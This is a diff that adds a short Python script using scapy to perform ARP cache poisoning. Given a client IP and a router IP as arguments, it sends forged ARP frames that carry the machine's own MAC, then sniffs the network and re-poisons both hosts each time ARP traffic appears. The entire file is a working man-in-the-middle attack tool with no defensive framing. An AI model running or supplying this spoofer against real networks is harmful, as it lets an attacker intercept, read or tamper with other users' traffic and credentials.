@@ -0,0 +1,31 @@
#!/usr/bin/python


from scapy.all import *
import sys

my_mac=open('/sys/class/net/eth0/address').readline()
mac_addr=my_mac.split('\n')

def PacketHandler(pkt):
	
	if pkt.haslayer(ARP):
			
		client=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has',hwsrc=mac_addr[0],psrc=sys.argv[2],pdst=sys.argv[1])
		client_response=srp1(client,inter=2,verbose=0)
		#ARP Response Client's MAC
		client_ARP=client_response.getlayer(ARP).hwsrc
		router=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has',hwsrc=mac_addr[0],psrc=sys.argv[1],pdst=sys.argv[2])
		srp1(router,inter=2,verbose=0)
		print "Poisoning Client -> "+client_ARP+"<->"+client.hwsrc+' ARP Reply  '+router.getlayer(ARP).pdst+" is-at "+client.hwsrc
		
client=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has',hwsrc=mac_addr[0],psrc=sys.argv[2],pdst=sys.argv[1])
router=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has',hwsrc=mac_addr[0],psrc=sys.argv[1],pdst=sys.argv[2])
sendp(client,verbose=0)
sendp(router,verbose=0)
		
#Routing
#conf.route.add(host=sys.argv[1],gw='192.168.1.4')
#conf.route.add(host=sys.argv[2],gw='192.168.1.4')

sniff(iface="eth0",count=5000,prn=PacketHandler)
